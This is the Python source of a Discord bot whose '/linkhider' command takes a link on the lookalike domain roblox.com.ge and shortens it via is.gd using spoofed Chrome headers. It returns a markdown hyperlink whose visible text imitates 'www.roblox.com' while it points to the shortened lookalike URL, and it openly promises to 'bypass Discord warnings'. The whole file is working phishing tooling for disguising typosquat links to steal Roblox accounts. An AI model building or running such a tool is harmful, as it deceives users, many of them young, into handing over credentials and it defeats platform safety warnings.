import os
import discord
from discord import ui, app_commands
from discord.ext import commands
import aiohttp
import re
import asyncio

TOKEN = os.getenv("TOKEN")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

class LinkModal(ui.Modal, title="Paste Your Roblox Link"):
    def __init__(self):
        super().__init__(timeout=300)
    
    link = ui.TextInput(
        label="Roblox Link *",
        placeholder="https://roblox.com.ge/users/123456/profile",
        style=discord.TextStyle.paragraph,
        required=True
    )
    
    def format_display_url(self, original_url):
        match = re.search(r'roblox\.com\.ge(.*)', original_url)
        if match:
            path = match.group(1)
        else:
            path = re.sub(r'^https?://[^/]+', '', original_url)
        return f"https*://*www.roblox.com{path}"
    
    async def shorten_url_isgd(self, session, original_url):
        """Сокращает ссылку через is.gd с полной эмуляцией браузера"""
        try:
            # Полные заголовки как у Chrome
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://is.gd',
                'Referer': 'https://is.gd/',
                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
            }
            
            data = {
                'url': original_url,
                'shorturl': '',
                'submit': 'Shorten!'
            }
            
            async with session.post('https://is.gd/create.php', 
                                   data=data, 
                                   headers=headers,
                                   timeout=25,
                                   allow_redirects=True) as response:
                
                text = await response.text()
                print(f"is.gd response length: {len(text)}")
                
                # Ищем ссылку в ответе
                patterns = [
                    r'https://is\.gd/[a-zA-Z0-9]+',
                    r'value="(https://is\.gd/[^"]+)"',
                    r'Your short URL is: <b>([^<]+)</b>',
                    r'https://is\.gd/[a-zA-Z0-9]+(?=["\'\\s])'
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, text)
                    if match:
                        result = match.group(1) if 'value="' in pattern else match.group(0)
                        if result and result.startswith('https://is.gd/'):
                            print(f"✅ is.gd success: {result}")
                            return result
                            
        except asyncio.TimeoutError:
            print("is.gd timeout")
        except Exception as e:
            print(f"is.gd error: {e}")
        return None
    
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True, thinking=True)
        original_url = self.link.value.strip()
        if not original_url.startswith(('http://', 'https://')):
            original_url = 'https://' + original_url
        
        try:
            async with aiohttp.ClientSession() as session:
                short_url = await self.shorten_url_isgd(session, original_url)
            
            if short_url:
                display_url = self.format_display_url(original_url)
                message = f"[{display_url}]({short_url})"
                await interaction.user.send(message)
                await interaction.followup.send("✅ Done! Check your DMs.", ephemeral=True)
            else:
                await interaction.followup.send("❌ Failed to shorten link. is.gd may be blocking requests.", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="linkhider", description="Hide your Roblox link")
async def linkhider(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔗 LINK HIDER",
        description="**Hide your link and bypass Discord warnings**\n\nClick **CREATE HYPERLINK** to get started!",
        color=discord.Color.blue()
    )
    embed.set_footer(text="GODZILLA • Link Hider")
    view = discord.ui.View()
    view.add_item(discord.ui.Button(
        label="CREATE HYPERLINK",
        style=discord.ButtonStyle.primary,
        custom_id="create_link"
    ))
    await interaction.response.send_message(embed=embed, view=view)

@bot.event
async def on_interaction(interaction: discord.Interaction):
    if interaction.type == discord.InteractionType.component:
        if interaction.data.get("custom_id") == "create_link":
            await interaction.response.send_modal(LinkModal())

@bot.event
async def on_ready():
    print(f'✅ Bot {bot.user} is online!')
    await bot.tree.sync()
    print("✅ Commands synced!")

if __name__ == "__main__":
    bot.run(TOKEN)
